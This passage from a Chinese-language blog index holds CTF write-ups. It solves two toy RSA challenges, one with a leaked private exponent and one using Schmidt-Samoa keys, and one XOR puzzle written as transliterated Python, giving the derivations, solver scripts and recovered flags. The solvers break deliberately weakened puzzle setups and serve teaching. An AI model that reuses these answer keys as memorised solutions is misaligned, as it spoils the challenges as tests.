class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag=<span class="hljs-string">b&#x27;ISCTF&#123;********&#125;&#x27;</span><br>m=bytes_to_long(flag)<br><br>p=libnum.generate_prime(<span class="hljs-number">1024</span>)<br>q=libnum.generate_prime(<span class="hljs-number">1024</span>)<br>n=p*q<br>e=<span class="hljs-number">0x10001</span><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br>d=inverse(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>leak = (d+(<span class="hljs-built_in">pow</span>(p,q,n)+<span class="hljs-built_in">pow</span>(q,p,n)))%n<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c=&quot;</span>, c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n=&quot;</span>, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;leak=&quot;</span>, leak)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">c= 8989289659072309605793417141528767265266446236550650613514493589798432446586991233583435051268377555448062724563967695425657559568596372723980081067589103919296476501677424322525079257328042851349095575718347302884996529329066703597604694781627113384086536158793653551546025090807063130353950841148535682974762381044510423210397947080397718080033363000599995100765708244828566873128882878164321817156170983773105693537799111546309755235573342169431295776881832991533489235535981382958295960435126843833532716436804949502318851112378495533302256759494573250596802016112398817816155228378089079806308296705261876583997</span><br><span class="hljs-string">n= 13424018200035368603483071894166480724482952594135293395398366121467209427078817227870501294732149372214083432516059795712917132804111155585926502759533393295089100965059106772393520277313184519450478832376508528256865861027444446718552169503579478134286009893965458507369983396982525906466073384013443851551139147777507283791250268462136554061959016630318688169168797939873600493494258467352326974238472394214986505312411729432927489878418792288365594455065912126527908319239444514857325441614280498882524432151918146061570116187524918358453036228204087993064505391742062288050068745930452767100091519798860487150247</span><br><span class="hljs-string">leak= 9192002086528025412361053058922669469031188193149143635074798633855112230489479254740324032262690315813650428270911079121913869290893574897752990491429582640499542165616254566396564016734157323265631446079744216458719690853526969359930225042993006404843355356540487296896949431969541367144841985153231095140361069256753593550199420993461786814074270171257117410848796614931926182811404655619662690700351986753661502438299236428991412206196135090756862851230228396476709412020941670878645924203989895008014836619321109848938770269989596541278600166088022166386213646074764712810133558692545401032391239330088256431881</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>$\because 已知leak&#x3D;(d+p^qmodn+q^pmodn)modn$</p><p>$令x&#x3D;p^qmodn,则有x&#x3D;p^q+kn,即x&#x3D;p^q+k(p*q)$</p><p>$\therefore xmodq&#x3D;(p^q+k(p*q)modq&#x3D;p^qmodq$</p><p>$\therefore x*p^{-1}&#x3D;p^{q-1}modq$</p><p>$\because q是素数$</p><p>$\therefore 由费马小定理得p^{q-1}&#x3D;x*p^{-1}&#x3D;1modq$</p><p>$\therefore x&#x3D;pmodq,即p^qmodn&#x3D;pmodp$</p><p>$同理，得q^pmodn&#x3D;q$</p><p>$\therefore d&#x3D;leak-(pmodq+qmodp)modn$</p><p>$\because n是2047bit，leak是2043bit，p+q在1024bit左右$</p><p>$\therefore d最有可能直接等于leak-(p+q)$</p><p>$\because p+q&#x3D;n+1-(p-1)(q-1)$</p><p>且d是e关于mod(p-1)(q-1)的逆</p><p>$\therefore d&#x3D;leak-n-1$</p><p>之后直接简单的RSA解密就行</p><p><strong>代码如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>c= <span class="hljs-number">8989289659072309605793417141528767265266446236550650613514493589798432446586991233583435051268377555448062724563967695425657559568596372723980081067589103919296476501677424322525079257328042851349095575718347302884996529329066703597604694781627113384086536158793653551546025090807063130353950841148535682974762381044510423210397947080397718080033363000599995100765708244828566873128882878164321817156170983773105693537799111546309755235573342169431295776881832991533489235535981382958295960435126843833532716436804949502318851112378495533302256759494573250596802016112398817816155228378089079806308296705261876583997</span><br>n= <span class="hljs-number">13424018200035368603483071894166480724482952594135293395398366121467209427078817227870501294732149372214083432516059795712917132804111155585926502759533393295089100965059106772393520277313184519450478832376508528256865861027444446718552169503579478134286009893965458507369983396982525906466073384013443851551139147777507283791250268462136554061959016630318688169168797939873600493494258467352326974238472394214986505312411729432927489878418792288365594455065912126527908319239444514857325441614280498882524432151918146061570116187524918358453036228204087993064505391742062288050068745930452767100091519798860487150247</span><br>leak= <span class="hljs-number">9192002086528025412361053058922669469031188193149143635074798633855112230489479254740324032262690315813650428270911079121913869290893574897752990491429582640499542165616254566396564016734157323265631446079744216458719690853526969359930225042993006404843355356540487296896949431969541367144841985153231095140361069256753593550199420993461786814074270171257117410848796614931926182811404655619662690700351986753661502438299236428991412206196135090756862851230228396476709412020941670878645924203989895008014836619321109848938770269989596541278600166088022166386213646074764712810133558692545401032391239330088256431881</span><br>e=<span class="hljs-number">0x10001</span><br><br>d=leak-n-<span class="hljs-number">1</span><br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>运行得到flag:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">b&#x27;ISCTF&#123;u_got_it&#125;&#x27;<br></code></pre></td></tr></table></figure><h2 id="六、Schmidt-Samoa（RSA）"><a href="#六、Schmidt-Samoa（RSA）" class="headerlink" title="六、Schmidt-Samoa（RSA）"></a>六、Schmidt-Samoa（RSA）</h2><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span>*<br><br>flag = <span class="hljs-string">b&#x27;D0g3xGC&#123;****************&#125;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_key</span>(<span class="hljs-params">p, q</span>):<br>    public_key = p*p*q        <br>    e = public_key        <br>    n = p*q<br>    phi_n = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>    private_key = inverse(e,phi_n)<br>    <span class="hljs-keyword">return</span> public_key,private_key,e<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br><br>N,d,e = gen_key(p,q)<br><br>c = gmpy2.powmod(bytes_to_long(flag),e,N)<br><br><span class="hljs-built_in">print</span>(N)<br><span class="hljs-built_in">print</span>(d)<br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489</span><br><span class="hljs-string">d = 58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009</span><br><span class="hljs-string">c = 82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>（本题考查Schmidt-Samoa密码系统）</p><p>分析题目，可以知道，本题的关键在于求出$p\times q$。</p><p>设a为一个较小的正整数，则$a^{N \times d}\equiv a^{k \times (p-1)(q-1)}\equiv amodp\times q$</p><p>$\therefore a^{N\times d}-a\equiv 0modp\times q$</p><p>$\therefore a^{N\times d}-a&#x3D;k\times p\times q$</p><p>$\because N&#x3D;p \times p\times q$</p><p>$\therefore p\times q&#x3D;gcd(a^{N\times d}-a,N)$,为了方便将取a&#x3D;2</p><p>接着进行简单的RSA解密就行</p><p><strong>代码如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>n = <span class="hljs-number">539403894871945779827202174061302970341082455928364137444962844359039924160163196863639732747261316352083923762760392277536591121706270680734175544093484423564223679628430671167864783270170316881238613070741410367403388936640139281272357761773388084534717028640788227350254140821128908338938211038299089224967666902522698905762169859839320277939509727532793553875254243396522340305880944219886874086251872580220405893975158782585205038779055706441633392356197489</span><br>d = <span class="hljs-number">58169755386408729394668831947856757060407423126014928705447058468355548861569452522734305188388017764321018770435192767746145932739423507387500606563617116764196418533748380893094448060562081543927295828007016873588530479985728135015510171217414380395169021607415979109815455365309760152218352878885075237009</span><br>c = <span class="hljs-number">82363935080688828403687816407414245190197520763274791336321809938555352729292372511750720874636733170318783864904860402219217916275532026726988967173244517058861515301795651235356589935260088896862597321759820481288634232602161279508285376396160040216717452399727353343286840178630019331762024227868572613111538565515895048015318352044475799556833174329418774012639769680007774968870455333386419199820213165698948819857171366903857477182306178673924861370469175</span><br><br>pq=gcd(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,n*d,n)-<span class="hljs-number">2</span>,n)<br>m=<span class="hljs-built_in">pow</span>(c,d,pq)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>运行得到flag：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">b&#x27;D0g3xGC&#123;W1sh_Y0u_Go0d_L@ucK-111&#125;&#x27;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Misc-题目复现</title>
    <link href="/2024/10/30/Misc-%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/10/30/Misc-%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="一、派森"><a href="#一、派森" class="headerlink" title="一、派森"></a>一、派森</h2><p><strong>题目</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">腐乳昂木 奥普瑞特儿 阴坡尔特 艾克斯奥尔<br>腐乳昂木 提克有第爱慕 阴坡尔特 ⭐<br>弗拉格 等于 布拉布拉布拉布拉布拉布拉布拉布拉布拉布拉布拉布拉布拉布拉布拉布拉布拉布拉布拉布拉<br>印刻 等于 左中括号右中括号<br>佛儿 唉 因 梯软者左括号 零，楞左括号弗拉格右括号，四右括号冒号<br>    印刻。鹅潘德（艾克斯奥尔（奥尔德（弗拉格【唉】），奥尔德（弗拉格【唉加二】）））<br>    印刻。鹅潘德（艾克斯奥尔（奥尔德（弗拉格【唉加一】），奥尔德（弗拉格【唉加三】）））<br>    印刻。鹅潘德（奥尔德（弗拉格【唉加二】））<br>    印刻。鹅潘德（奥尔德（弗拉格【唉加三】））<br>普瑞因恩特左括号印刻右括号<br>井号[<span class="hljs-number">16</span>, <span class="hljs-number">29</span>, <span class="hljs-number">67</span>, <span class="hljs-number">84</span>, <span class="hljs-number">31</span>, <span class="hljs-number">75</span>, <span class="hljs-number">89</span>, <span class="hljs-number">48</span>, <span class="hljs-number">30</span>, <span class="hljs-number">111</span>, <span class="hljs-number">107</span>, <span class="hljs-number">48</span>, <span class="hljs-number">49</span>, <span class="hljs-number">52</span>, <span class="hljs-number">95</span>, <span class="hljs-number">67</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">110</span>, <span class="hljs-number">51</span>, <span class="hljs-number">44</span>, <span class="hljs-number">69</span>, <span class="hljs-number">95</span>, <span class="hljs-number">118</span>, <span class="hljs-number">74</span>, <span class="hljs-number">45</span>, <span class="hljs-number">121</span>, <span class="hljs-number">95</span>, <span class="hljs-number">70</span>, <span class="hljs-number">84</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">113</span>, <span class="hljs-number">125</span>]<br></code></pre></td></tr></table></figure><p>很有意思，是一个音译后的python代码，大概翻译过来，得到如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> operator <span class="hljs-keyword">import</span> xor<br><span class="hljs-keyword">from</span> 提克有第爱慕 <span class="hljs-keyword">import</span> *<br>flag = &#123;********************&#125;<br>ans = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>，<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">4</span>):<br>    ans.append(xor(<span class="hljs-built_in">ord</span>(flag[i])，<span class="hljs-built_in">ord</span>(flag[i+<span class="hljs-number">2</span>])))<br>    ans.append(xor(<span class="hljs-built_in">ord</span>(flag[i+<span class="hljs-number">1</span>])，<span class="hljs-built_in">ord</span>(flag[i+<span class="hljs-number">3</span>])))<br>    ans.append(<span class="hljs-built_in">ord</span>(flag[i+<span class="hljs-number">2</span>]))<br>    ans.append(<span class="hljs-built_in">ord</span>(flag[i+<span class="hljs-number">3</span>]))<br><span class="hljs-built_in">print</span>(ans)<br><span class="hljs-comment">#[16, 29, 67, 84, 31, 75, 89, 48, 30, 111, 107, 48, 49, 52, 95, 67, 6, 2, 110, 51, 44, 69, 95, 118, 74, 45, 121, 95, 70, 84, 49, 49, 0, 0, 33, 33, 0, 10, 113, 125]</span><br></code></pre></td></tr></table></figure><p>没猜到”提克有第爱”对应的代码，但并不影响做题，只是简单的异或。</p><p>由于<strong>异或</strong>连续进行两次后会得到原数据，因此按照原逻辑便可以解出答案，代码实现如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> operator <span class="hljs-keyword">import</span> xor<br><br>ans = [<span class="hljs-number">16</span>, <span class="hljs-number">29</span>, <span class="hljs-number">67</span>, <span class="hljs-number">84</span>, <span class="hljs-number">31</span>, <span class="hljs-number">75</span>, <span class="hljs-number">89</span>, <span class="hljs-number">48</span>, <span class="hljs-number">30</span>, <span class="hljs-number">111</span>, <span class="hljs-number">107</span>, <span class="hljs-number">48</span>, <span class="hljs-number">49</span>, <span class="hljs-number">52</span>, <span class="hljs-number">95</span>, <span class="hljs-number">67</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">110</span>, <span class="hljs-number">51</span>, <span class="hljs-number">44</span>, <span class="hljs-number">69</span>, <span class="hljs-number">95</span>, <span class="hljs-number">118</span>, <span class="hljs-number">74</span>, <span class="hljs-number">45</span>, <span class="hljs-number">121</span>, <span class="hljs-number">95</span>, <span class="hljs-number">70</span>, <span class="hljs-number">84</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">113</span>, <span class="hljs-number">125</span>]<br>flag = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(ans), <span class="hljs-number">4</span>):<br>        flag.append(<span class="hljs-built_in">chr</span>(xor(ans[i], ans[i + <span class="hljs-number">2</span>])))<br>        flag.append(<span class="hljs-built_in">chr</span>(xor(ans[i + <span class="hljs-number">1</span>], ans[i + <span class="hljs-number">3</span>])))<br>        flag.append(<span class="hljs-built_in">chr</span>(ans[i + <span class="hljs-number">2</span>]))<br>        flag.append(<span class="hljs-built_in">chr</span>(ans[i + <span class="hljs-number">3</span>]))<br><br>flag=<span class="hljs-string">&#x27;&#x27;</span>.join(flag)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>运行得到flag:</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">SICTF&#123;Y0u_k0nw_Ch1n3s3_v3ry_we11!!!!qwq&#125;![Hello Blog](test.jpg)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
